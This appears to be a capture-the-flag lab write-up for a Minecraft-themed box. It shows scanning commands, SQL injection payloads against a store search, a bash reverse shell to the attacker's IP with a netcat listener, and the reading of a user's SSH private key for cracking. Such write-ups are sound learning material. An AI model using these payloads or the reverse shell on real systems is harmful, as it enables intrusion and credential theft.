Project Description

I performed network and web enumeration of the target host, which led to the discovery of active services and additional subdomains. I identified a SQL Injection vulnerability in the store search functionality, determined the number of columns in the backend query, and extracted database information using a UNION-based SQL injection.

nmap -p- --min-rate 5000 10.65.142.1
gobuster dir -u http://store.cybercrafted.thm -w /usr/share/wordlists/dirb/common.txt -x php -t 40

' OR 1=1-- -
' ORDER BY 4-- -
' UNION SELECT 1,2,3,4-- -

🖥️ Environment

Attacker:
10.65.82.229 (Kali / AttackBox)

Target:
10.65.162.153

Domains:

cybercrafted.thm
store.cybercrafted.thm
admin.cybercrafted.thm

1️⃣ Reconnaissance
nmap -p- --min-rate 5000 10.65.162.153


Open ports:

22 — SSH

80 — HTTP

25565 — Minecraft

➡️ Primary attack vector: HTTP

2️⃣ Initial Access (Web → Reverse Shell)

Command execution achieved via admin panel.

bash -c 'bash -i >& /dev/tcp/10.65.82.229/4444 0>&1'


Listener:

nc -lvnp 4444


Result:

www-data@cybercrafted:/var/www/admin$

3️⃣ Shell Stabilization
python3 -c 'import pty; pty.spawn("/bin/bash")'

stty raw -echo; fg
export TERM=xterm

4️⃣ Enumeration
ls /home


Users found:

cybercrafted

xxultimatecreeperxx

5️⃣ Credential Access — SSH Private Key
cat /home/xxultimatecreeperxx/.ssh/id_rsa


Key properties:

RSA private key

Encrypted (AES-128-CBC)

Passphrase protected

➡️ Suitable for ssh2john + John the Ripper

6️⃣ Exfiltration Issue

Manual key copy resulted in:

base64 corruption

incorrect padding

invalid RSA structure

❗ SSH keys must be copied fully and intact.

7️⃣ Cracking Preparation (Failed)
python3 /opt/john/ssh2john.py id_rsa > id_rsa.hash


Error:

base64 decoding error: Incorrect padding


Reason: corrupted private key
